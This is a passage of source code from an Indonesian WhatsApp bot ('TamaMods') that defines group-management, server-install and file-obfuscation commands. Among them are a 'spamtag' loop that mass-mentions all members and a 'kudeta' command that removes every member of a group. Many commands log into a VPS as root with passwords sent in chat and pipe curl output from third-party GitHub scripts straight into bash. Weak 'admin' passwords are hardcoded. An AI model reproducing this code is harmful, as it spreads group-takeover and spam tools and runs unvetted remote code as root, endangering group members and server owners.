return Reply(example("628xx"))
}
}
break
//------(Batas Case)------//
case 'invite': {
	if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!text) return Reply(`Silakan Masukkan Nomer yang Ingin Anda Invite\n\nContoh :\n*${prefix+command}* 6285973150738`)
if (text.includes('+')) return Reply(`Enter the number together without *+*`)
if (isNaN(text)) return Reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await TamaMods.groupInviteCode(group)
      await TamaMods.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        Reply(` An invite link is sent to the user`) 
}
break
//------(Batas Case)------//
case "spamtag": case "tag": {
    if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)

    if (!text) return Reply('*Example : .spamtag tag|jumlah spam*')

    // Split the input to get the tag/user and the number of spams
    const args = text.split("|");
    const tag = args[0]; // @tag or user number
    const spamCount = args[1] ? parseInt(args[1].trim()) : 1; // Default to 1 if no count is given

    if (isNaN(spamCount) || spamCount < 1) {
        return Reply("Jumlah spam tidak valid. Harap masukkan angka yang valid.");
    }

    // If the mentioned user is not valid, handle error
    let input = m.mentionedJid[0] ? m.mentionedJid[0] : tag ? tag.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;

    if (!input) return Reply("Tag atau nomor yang valid harus diberikan.");

    let member = m.metadata.participants.map(v => v.id); // List of group members
    
    // Spam tag the user as many times as specified
    for (let i = 0; i < spamCount; i++) {
        await TamaMods.sendMessage(m.chat, { text: text, mentions: [input, ...member] }, { quoted: pantek });
    }
    
    await Reply(`Berhasil spam tag ${spamCount} kali!`);
}
break;

//================================================================================
case "kicktime": case "kiktime": {
    if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)

    if (text || m.quoted) {
        const args = text.split("|"); // Splitting input into @tag and time
        const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0] ? args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
        const timeString = args[1] ? args[1].trim() : "10"; // Default time 10 seconds if no time is given

        // Check if timeString is a valid number
        let timeInSeconds = parseInt(timeString);
        if (isNaN(timeInSeconds)) return Reply("Waktu yang diberikan tidak valid. Harap masukkan waktu dalam detik.");

        var onWa = await TamaMods.onWhatsApp(input.split("@")[0]);
        if (onWa.length < 1) return Reply("Nomor tidak terdaftar di WhatsApp");

        // Inform the group about the kick time
        await Reply(`User ${input.split("@")[0]} akan dikeluarkan dalam ${timeInSeconds} detik...`);

        // Start the countdown
        let countdownMessage = await TamaMods.sendMessage(m.chat, { text: `Kicking user in: ${timeInSeconds} detik...` });

        // Countdown loop
        let interval = setInterval(async () => {
            timeInSeconds--;
            if (timeInSeconds <= 0) {
                clearInterval(interval); // Stop the countdown

                // Kick the user out of the group
                const res = await TamaMods.groupParticipantsUpdate(m.chat, [input], 'remove');
                await TamaMods.sendMessage(m.chat, { text: `Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini` });

                // Delete countdown message
                await TamaMods.deleteMessage(m.chat, countdownMessage.key);
            } else {
                // Update countdown message
                await TamaMods.sendMessage(m.chat, { text: `Kicking user in: ${timeInSeconds} detik...` }, { quoted: countdownMessage });
            }
        }, 1000); // Every 1 second

    } else {
        return Reply(example("@tag|waktu"));
    }
}
break;

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await TamaMods.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return Reply("Nomor tidak terdaftar di whatsapp")
const res = await TamaMods.groupParticipantsUpdate(m.chat, [input], 'remove')
await Reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return Reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await Reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await TamaMods.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await TamaMods.groupRevokeInvite(m.chat)
Reply("Berhasil mereset link grup")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return Reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await TamaMods.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: pantek})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await TamaMods.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await TamaMods.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: pantek})
}
break

//================================================================================

case "ht": case "hidetag": case "h": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return Reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await TamaMods.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: pantek})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return Reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await TamaMods.groupAcceptInvite(result)
Reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("https://example.com"))
let data = await fetchJson(text)
Reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return Reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return Reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await TamaMods.newsletterMetadata("invite", result)
await TamaMods.newsletterFollow(res.id)
Reply(`
*Berhasil join channel whatsapp*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break
//------(Batas Case)------//
case "reactch": {
if (!isOwner) return Reply(mess.owner)
if (!text) return example("linkpesan 😂")
if (!args[0] || !args[1]) return example("linkpesan 😂")
if (!args[0].includes("https://whatsapp.com/channel/")) return Reply("Link tautan tidak valid")
let result = args[0].split('/')[4]
let serverId = args[0].split('/')[5]
let res = await TamaMods.newsletterMetadata("invite", result)
await TamaMods.newsletterReactMessage(res.id, serverId, args[1])
Reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return Reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return Reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await TamaMods.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await TamaMods.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return Reply("Grup Ini Sudah Tidak Ada Member!")
await Reply("Kudeta Grup By TamaMods Starting 🔥")
for (let i of memberFilter) {
await TamaMods.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await Reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case 'promoteall':
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
var groupe = await TamaMods.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TamaMods.groupParticipantsUpdate(m.chat, mems, 'promote')
break
//------(Batas Case)------//
case 'demoteall':
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
var groupe = await TamaMods.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TamaMods.groupParticipantsUpdate(m.chat, mems, 'demote')
break
//------(Batas Case)------//
case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await TamaMods.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await TamaMods.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: pantek})
})
} else {
return Reply(example("@tag/628xx"))
}
}
break
//------(Batas Case)------//
case "installtemanebula": {
if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
Reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil install *tema nebula* pterodactyl 🔥")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//------(Batas Case)------//
case "installdepend": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return Reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return Reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
 
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
Reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => { 
await Reply("Berhasil install Depend silakan ketik .installtemanebula ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('11\n');
stream.write('A\n');
stream.write('Y\n');
stream.write('Y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemaelysium": {
if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
const ress = new Client();

ress.on('ready', async () => {
Reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil install *tema Elysium* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
 stream.write('1\n');
stream.write('y\n');
stream.write('yes\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break   

case "installtemanightcore": case "installthemanightcore": {
if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
Reply("Memproses install *tema night core* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil install *tema nightcore* pterodactyl 🔥")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('1\n');
stream.write('y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return Reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return Reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await Reply("Memproses *uninstall* thema pterodactyl\nTunggu 1-10 menit hingga proses selesai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil *uninstall* thema pterodactyl 🔥")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtema": case "installtemastelar": {
if (!text || !text.split("|")) return Reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return Reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

const command = `bash <(curl https://raw.githubusercontent.com/Fahrihosting/installthema/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
Reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {
await TamaMods.sendMessage(m.chat, {
    text: `Berhasil Install *Tema stellar* Pterodactyl✅️`,
    footer: `${footer}`,
    buttons: [
  { buttonId: '.owner', buttonText: { displayText: 'Owner TamaMods' }, type: 1,}, 
  {
  buttonId: 'action',
  buttonText: { displayText: 'ini pesan interactiveMeta' },
  type: 4,
  nativeFlowInfo: {
  name: 'single_select',
  paramsJson: JSON.stringify({
  title: 'message',
  sections: [
  {
  title: 'Pilih Menu',
  highlight_label: 'Tama Modss',
  rows: [
{ title: "🔹Uninstall Tema", description: "Untuk Menghapus Tema", id: `.uninstalltema ${ipvps}|${passwd}`},
  ]}]})}}],
    headerType: 1,
    viewOnce: true,
  }, { quoted: pantek });
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`fahriofficial\n`) // Key Token : yilzizodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return Reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return Reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
Reply("Memproses install *thema billing* pterodactyl\nTunggu 1-10 menit hingga proses selesai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil install *thema billing* pterodactyl 🔥")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return Reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return Reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return Reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
Reply("Memproses install *thema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selesai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await Reply("Berhasil install *thema enigma* pterodactyl 🔥")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6283132860356\n');
stream.write('https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R\n');
stream.write('https://whatsapp.com/channel/0029VbBcB2mBVJl4TQ8AKL2R\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
Reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "uninstallpanel": {
if (!isCreator) return Reply(mess.owner);
if (!text || !text.split("|")) return Reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return Reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await Reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selesai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await Reply("Berhasil *uninstall* server panel 🔥")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
Reply('Berhasil Uninstall Server Panel 🔥');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
Reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
Reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return Reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await TamaMods.sendMessage(m.chat, {text: teks}, {quoted: pantek})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By TamaMods\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By TamaMods\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await Reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selesai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//================================================================================

case 'encrypt': case 'enc': {
if (!m.quoted) return Reply("Reply file .js")
if (mime !== "application/javascript") return Reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@enc${filename}.js`, media)
await Reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@enc${filename}.js`).toString(), {
  target: "node",
  preset: "low"
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
  await TamaMods.sendMessage(m.chat, {document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: pantek})
}).catch(e => Reply("Error :" + e))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'encryptmed': case 'encmed': {
if (!m.quoted) return Reply("Reply file .js")
if (mime !== "application/javascript") return Reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@enc${filename}.js`, media)
await Reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@enc${filename}.js`).toString(), {
  target: "node",
  preset: "medium"
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
  await TamaMods.sendMessage(m.chat, {document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: pantek})
}).catch(e => Reply("Error :" + e))
}
break
